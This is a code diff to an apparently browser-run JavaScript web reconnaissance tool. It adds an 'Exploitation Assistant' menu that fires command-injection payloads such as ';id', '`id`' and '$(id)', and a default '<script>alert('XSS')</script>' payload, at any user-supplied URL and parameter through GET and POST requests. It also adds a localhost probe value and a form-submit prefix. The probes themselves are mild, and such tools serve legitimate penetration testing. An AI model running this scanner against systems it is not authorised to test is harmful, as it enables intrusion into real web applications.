@@ -109,6 +109,7 @@ async function compareResponses(baselineText, url, param) {
             Math.random().toString(36).substring(2, 15), // Random string
             Math.floor(Math.random() * 1000), // Random integer
 			1, // Low integer
+			'127.0.0.1', // localhost
             null // Null value
         ];
 
@@ -153,7 +154,7 @@ async function checkResponse(purl, param, value, baselineText, method) {
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 },
-                body: `${param}=${encodeURIComponent(value)}`
+                body: `Submit=Submit&${param}=${encodeURIComponent(value)}`
             });
             responseText = await response.text();
 
@@ -234,6 +235,112 @@ async function mineParamsMenu() {
     }
 }
 
+// Exploitation Assistant
+async function exploitationAssistant() {
+    console.clear();
+    console.log(`\n💥 Exploitation Assistant`);
+    console.log(`1. Test for Command Injection`);
+    console.log(`2. Test for XSS`);
+    console.log(`3. Back`);
+
+    const choice = prompt("\nChoose an option (1-3):");
+
+    switch (choice) {
+        case '1':
+            const cmdInjectionUrl = prompt("Enter the target URL for command injection:");
+			const cmdInjectionParam = prompt("Enter the parameter you want to test for command injection:");
+            if (cmdInjectionUrl, cmdInjectionParam) await testCommandInjection(cmdInjectionUrl, cmdInjectionParam);
+            break;
+        case '2':
+            const xssUrl = prompt("Enter the target URL for XSS:");
+			const xssParam = prompt("Enter the parameter you want to test for XSS:");
+			const xssPayload = prompt("Enter the payload, or use default:", `<script>alert('XSS')</script>`);
+            if (xssUrl, xssParam, xssPayload) await testXSS(xssUrl, xssParam, xssPayload);
+            break;
+        case '3':
+            return;
+        default:
+            console.log("❌ Invalid choice. Try again.");
+            await exploitationAssistant();
+            break;
+    }
+}
+
+// Command Injection Test
+async function testCommandInjection(url, param) {
+    console.log(`\n🚀 Testing for Command Injection on: ${url}`);
+
+    const payloads = [
+        ";id",
+        "|| id",
+        "& id",
+        "`id`",
+        "$(id)"
+    ];
+
+    for (const payload of payloads) {
+        try {
+            // GET request
+            const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
+            const getResponse = await fetch(testUrl);
+            const getResponseText = await getResponse.text();
+
+            if (getResponseText.includes("uid=")) {
+                console.log(`💥 Possible Command Injection (GET): ${testUrl}`);
+            }
+
+            // POST request
+            const postResponse = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `${param}=${encodeURIComponent(payload)}`
+            });
+            const postResponseText = await postResponse.text();
+
+            if (postResponseText.includes("uid=")) {
+                console.log(`💥 Possible Command Injection (POST): ${url} with body "${param}=${payload}"`);
+            }
+        } catch (error) {
+            console.error(`❌ Error testing injection: ${error.message}`);
+        }
+    }
+}
+
+// XSS Test
+async function testXSS(url, param, payload) {
+    console.log(`\n🚀 Testing for XSS on: ${url}`);
+
+    try {
+        // GET request
+        const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
+        const getResponse = await fetch(testUrl);
+        const getResponseText = await getResponse.text();
+
+        if (getResponseText.includes(payload)) {
+            console.log(`💥 Possible XSS Vulnerability (GET): ${testUrl}`);
+        }
+
+        // POST request
+        const postResponse = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: `${param}=${encodeURIComponent(payload)}`
+        });
+        const postResponseText = await postResponse.text();
+
+        if (postResponseText.includes(payload)) {
+            console.log(`💥 Possible XSS Vulnerability (POST): ${url} with body "${param}=${payload}"`);
+        }
+    } catch (error) {
+        console.error(`❌ Error testing XSS: ${error.message}`);
+    }
+}
+
+
 // Main menu
 async function mainMenu() {
     console.clear();
@@ -244,9 +351,10 @@ async function mainMenu() {
     console.log(`4. Mine Params ${discoveredPaths.size > 0 ? "" : "(Disabled)"}`);
     console.log(`5. Show Discovered Paths ${discoveredPaths.size > 0 ? "" : "(Disabled)"}`);
 	console.log(`6. Show Discovered Params ${paramMiningResults.size > 0 ? "" : "(Disabled)"}`);
-    console.log(`7. Exit`);
+	console.log(`7. Exploitation Assistant`);
+    console.log(`8. Exit`);
 
-    const choice = prompt("\nChoose an option (1-7):");
+    const choice = prompt("\nChoose an option (1-8):");
 
     switch (choice) {
         case '1':
@@ -300,7 +408,11 @@ async function mainMenu() {
             }
 			alert("Done");
             break;			
-        case '7':
+       case '7':
+            await exploitationAssistant();
+            break;
+ 			
+        case '8':
             console.log("\n👋 Exiting...");
             return;
         default:
@@ -311,5 +423,7 @@ async function mainMenu() {
     // Loop back to menu
     mainMenu();
 }
+ 
 
+// Start the tool
 mainMenu();
